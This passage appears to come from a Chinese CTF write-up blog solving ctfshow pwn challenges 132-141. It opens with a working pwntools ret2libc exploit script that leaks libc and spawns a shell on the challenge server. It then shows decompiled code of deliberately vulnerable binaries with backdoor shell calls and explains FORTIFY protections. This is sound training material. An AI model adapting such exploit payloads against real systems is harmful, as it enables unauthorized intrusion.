<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28215</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>) </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/32bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;main addr is here :\n&quot;</span>)</span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x2fc0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">132</span>) + p32(ebx) + <span class="string">&quot;bbbb&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">write = u32(io.recv()) </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write)</span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">140</span>) + p32(system) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-132"><a href="#pwn-132" class="headerlink" title="pwn 132"></a>pwn 132</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NTYxZWRjNWU0OGYxZDE1Y2ZmMzNmOWE1OTMwZGZiMDBfYmRZSHpWc0hSUlg0T3RVOWRHUXVmTDZLNGFtRWVyRzBfVG9rZW46Q2xkWGJUWEdZb1VLTlB4VmNGTGNkbHVWbktnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位保护全开，这里并没有开启FORTIFY保护</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NzM4YjVkNDg1ZjI2MWJjOGM3NjFhMTE5ZDE1OGE4ZTdfTVFJN28xcG9sczZtbkJUanVFRFZjN2xOcmN6ZFRMYklfVG9rZW46TnU5Q2JzN3I2b2cwc1Z4VkpaaGM3bFNDbnZNXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>跟进ctfshow函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NGM1NTFlYTgzYWY3ODdmYzdlNTk0ZGEyMjQ2YzQ3ZmRfcFNHdjBXaG01cUZKbzV0Vmlub3hGcUhkdUdmc2tSZHhfVG9rZW46SXZHQmJyTTNnb0YzR1Z4dTRvMmNwQXZvbmpmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>可以看到当输入的字符串为“CTFshow-daniu”时就能得到一个shell，由于没有开启FORTIFY保护，程序也就能正常执行：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=N2RjMDZjNDQ0ODFkZWJhZTRiNDAwYzAwZGQ0MWExODVfN2dKdkRMVTl5UGFvS0l1OFlCTk5oSWFxeTZKVWcxVG5fVG9rZW46RmtZV2J0YW5lbzFvRXR4TXlESWN2cW5Fbk5kXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>exp 略</p>
<h1 id="pwn-133"><a href="#pwn-133" class="headerlink" title="pwn 133"></a>pwn 133</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDcxZTY1NjA2ZTJkYjNjODc5NTNjZWYwMWQ4OWY2OWFfSVBnQTBSM3hpMGpnbTdVNW5sV1U2TGV2NTdqbDgybkNfVG9rZW46UHRlQWJ1WklZb3ZJeUR4YnB4WGNyMER2bmJoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位保护全开，可以看到这次开启了FORTIFY保护</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YWQxNDBlZjZkZDA4NDhkOTFjM2FjNWU1NDVjZDJjZTlfdDJjUlFkOXlJODlreDI1THpBc1dPOUtISWxCSDlwb3hfVG9rZW46T2U5b2JCQldmb2lQdUp4WmxneWNnRW1sbmloXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>同上一题比较，发现有些不安全函数已经被替换成安全函数了</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YTg4YmEyNzdmNTNiYmE0NjM0YWNhMjM5ZDc3MGE2NjNfM2R4R251ODJMOEdkem5UTFpNY2dtdnpGSm44WGNSSXNfVG9rZW46Q2JLbGJpTVdBbzZ0dm94UlhaVmMyTlRubkpoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>此时已经开启了缓冲区溢出攻击检查（不过这里也开启了Canary保护）</p>
<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ctfshow</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="type">bool</span> v9; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">bool</span> v10; <span class="comment">// zf</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v12; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">memcmp</span>(a1, <span class="string">&quot;CTFshow-daniu&quot;</span>, <span class="number">0xDu</span>LL) != <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = !v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">5LL</span>;</span><br><span class="line">    v6 = <span class="string">&quot;Stack&quot;</span>;</span><br><span class="line">    v7 = (<span class="type">const</span> <span class="type">char</span> *)a1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = *v7 &lt; (<span class="type">unsigned</span> <span class="type">int</span>)*v6;</span><br><span class="line">      v4 = *v7++ == *v6++;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    v8 = (!v3 &amp;&amp; !v4) - v3;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v10 = v8 == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="number">3LL</span>;</span><br><span class="line">      v12 = <span class="string">&quot;Fmt&quot;</span>;</span><br><span class="line">      v13 = (<span class="type">const</span> <span class="type">char</span> *)a1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !v11 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v9 = *v13 &lt; (<span class="type">unsigned</span> <span class="type">int</span>)*v12;</span><br><span class="line">        v10 = *v13++ == *v12++;</span><br><span class="line">        --v11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v10 );</span><br><span class="line">      <span class="keyword">if</span> ( (!v9 &amp;&amp; !v10) == v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Smart boy!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Fmt(<span class="string">&quot;Smart boy!&quot;</span>, v13);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(a1, <span class="string">&quot;check&quot;</span>, <span class="number">5uLL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%p\n&quot;</span>, a1);</span><br><span class="line">        <span class="keyword">return</span> _chk();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You are too young to simple!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Great boy!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> Stack_Overflow(<span class="string">&quot;Great boy!&quot;</span>, v7);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good boy!&quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%3$#p\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到程序既定的一些漏洞在开启此保护后很多函数都被替换成相对安全函数了：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YjQ1Yjc0MjMwNTQxMWUxNDMzMmI0NjU3NjIyZGVjZmFfTWR5M05aZjluY095TldEZDk4UldKZFpPaWlKRHNjaUdfVG9rZW46S3h4dWJiZmY0b21QQ054U09jNGNVZVdybmNoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>这里不再展开讲，详细内容在课程中会进行展开</p>
<p>这里就直接讲解题了，查看一下敏感字符串：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OTM0NjJkZDUyZDVkNzQ3YWVhYzMzYTIxZDRmMmZlNWZfRUV3SnJLYk9HdHUxMHlaOWZOY2o3V1FIc3E1Vnl4a2FfVG9rZW46Qzd5d2IzVjFlb0xUTVl4d0ZpOGNYWll4bktoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>上一题的后门函数还在，但是很明显，由于开启了FORTIFY保护</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQ4YTE4ZmQ3NjMxMTIyYzUyZjU1YmRjZDI2YjI3ZDVfQU5iTE9lcWRONjdqbFFIaUhuYTljUlpQcXA3RWR3ZVFfVG9rZW46VEdNZmJTS09mbzZ1NVB4RTV6UWNkREhEbnl2XzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>这条路根本走不下来，程序就会异常退出，看到还有一个&#x2F;ctfshow_flag文件，跟进查看一下：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NWMyNzRjYmE3MDRiNjdjNjY3YzY3YzRiMjVlYWIwYTRfdkllaFdiZ3hTSzdWYkZHZUJOa25nalFqUzRvU25mOXhfVG9rZW46Q3huWmJJblZHbzZ1Y094b085TWN6eEFobkFlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>可以看到如果程序走到这就会输出flag，理清逻辑，我们不难知道，当输入的字符串为“check”时即可输出flag</p>
<p>exp 略</p>
<h1 id="pwn-134"><a href="#pwn-134" class="headerlink" title="pwn 134"></a>pwn 134</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjFkODkxZjkxZDg0MTEyYzAwOTllZTllOWEzZmVjYWVfQVh6OVMyYzQzTGpzd3hNaXJmNkt3QTB1dG51b0ZJZTNfVG9rZW46RGlrZWJwTFY5b2pNbWJ4VXVyWGNyTHBhbk5kXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位保护全开，依旧开启了FORTIFY保护</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YTEzMThkNmZmZDZkM2I0ZGEzNWQ3YmNhMmVkN2E5NGFfNDhTOVFSNDVVZUNKRGYzalJ0RU1hOFZyWURjUG1BbUdfVG9rZW46RDNISWJ5Mlljb3lhTjB4eDVnRWN3SGxzbmtkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ctfshow</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v2; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">bool</span> v9; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">bool</span> v10; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v12; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">bool</span> v14; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">bool</span> v15; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">bool</span> v16; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v17; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v18; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v19; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">memcmp</span>(a1, <span class="string">&quot;CTFshow-daniu&quot;</span>, <span class="number">0xDu</span>LL) != <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = !v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="string">&quot;Stack&quot;</span>;</span><br><span class="line">    v6 = <span class="number">5LL</span>;</span><br><span class="line">    v7 = (<span class="type">const</span> <span class="type">char</span> *)a1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = *v7 &lt; (<span class="type">unsigned</span> <span class="type">int</span>)*v5;</span><br><span class="line">      v4 = *v7++ == *v5++;</span><br><span class="line">      --v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    v8 = (!v3 &amp;&amp; !v4) - v3;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v10 = v8 == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="string">&quot;Fmt&quot;</span>;</span><br><span class="line">      v12 = <span class="number">3LL</span>;</span><br><span class="line">      v13 = (<span class="type">const</span> <span class="type">char</span> *)a1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v9 = *v13 &lt; (<span class="type">unsigned</span> <span class="type">int</span>)*v11;</span><br><span class="line">        v10 = *v13++ == *v11++;</span><br><span class="line">        --v12;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v10 );</span><br><span class="line">      <span class="keyword">if</span> ( (!v9 &amp;&amp; !v10) == v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Smart boy!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Fmt(<span class="string">&quot;Smart boy!&quot;</span>, v13);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v14 = <span class="built_in">memcmp</span>(a1, <span class="string">&quot;Quit&quot;</span>, <span class="number">4uLL</span>) != <span class="number">0</span>;</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        v16 = !v14;</span><br><span class="line">        <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;See you ~&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = <span class="string">&quot;Exit&quot;</span>;</span><br><span class="line">        v18 = (<span class="type">const</span> <span class="type">char</span> *)a1;</span><br><span class="line">        v19 = <span class="number">4LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v15 = *v18 &lt; (<span class="type">unsigned</span> <span class="type">int</span>)*v17;</span><br><span class="line">          v16 = *v18++ == *v17++;</span><br><span class="line">          --v19;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v16 );</span><br><span class="line">        <span class="keyword">if</span> ( (!v15 &amp;&amp; !v16) == v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;See you again!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> daniu(<span class="string">&quot;See you again!&quot;</span>, v18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You are too young to simple!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Great boy!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> Stack_Overflow(<span class="string">&quot;Great boy!&quot;</span>, v7);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good boy!&quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%6$#x\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，逻辑原本挺简单的，但是被弄的非常复杂，同样的，存在后门函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZThkZGFkNzFjNjA1MTBkNzVlODQ1MjEwOTA4NjlkNWFfZFViNHhpdzdnTENDWm80TTVUNFp1eXhEa2pYTXRqTExfVG9rZW46SHJ1cmJMQVN6b3dEc1N4dEQ0UmNCQVl1bnRiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>只需要捋清楚哪里一步步调用一步步跟进就能获取到flag</p>
<p>其实仅仅只需要输入”Exit”然后等待几秒即可获得flag了</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OTY2MmU2YjYzOWVjMzEwNzYxNmRmNmI0ODk1YTBiMzdfbmFWSGlWT2Jkb2RzQ1BhSDJMZ050bDJ3czBmb0xvOU1fVG9rZW46SU5EWmJhZnlsb0NxUGN4eE5LNGNrRFpTbmpoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzk3NDkzMjBmZGM2NmIxZWI5Mjk2OWNmZTZmZTE2YzVfTDE5eUJEZjFDdzhNYVhLbEwxSXNzaTZ0YjdXaURiVEJfVG9rZW46RWhxVGJjbGN2b1pZYmh4Z2dFZGMzYTV5bnVoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>exp 略 </p>
<h1 id="pwn-135-pwn-140"><a href="#pwn-135-pwn-140" class="headerlink" title="pwn 135 - pwn 140"></a>pwn 135 - pwn 140</h1><p>135-140仅仅是为了让大家了解相关函数以及结构之类的基础知识，flag都给出了。</p>
<h1 id="pwn-141"><a href="#pwn-141" class="headerlink" title="pwn 141"></a>pwn 141</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmMwYjhjMDMyMTI3NWVhZDU2YWYyYWFlMTIwZGIyMGRfWnU0OWNmTkhMRk5wOHlldTh0WUJrdTlNV3lJaWhCeUFfVG9rZW46TTB1ZGJURlE3bzRSUk14cWw2WmNqNUlrbnBoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>32位开启Canary与NX保护</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTE1YzYzYzkwM2JhZDNlMWE3MDNhZmE1MWEyZDkyZDBfVU83NzMyaXFpR2pqMGJoMkNrUTlnODBqc2dBVm9jVHFfVG9rZW46RkNnT2JKdTIzb1Q4a254SUgwQWNJR3JlbndjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>看一下菜单：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTkyOTczNGE1NTVmYTEzYjU5ZDk3OGRhMDcwYjg5ODBfQmx3bmMxU3VQMzRaekhWTTI1eWdRbWl3VG80azRpSHpfVG9rZW46WGFFZGI3dzVXbzFrald4bjMxbmNtRGdWbm9DXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p>
<p>add_note():</p>
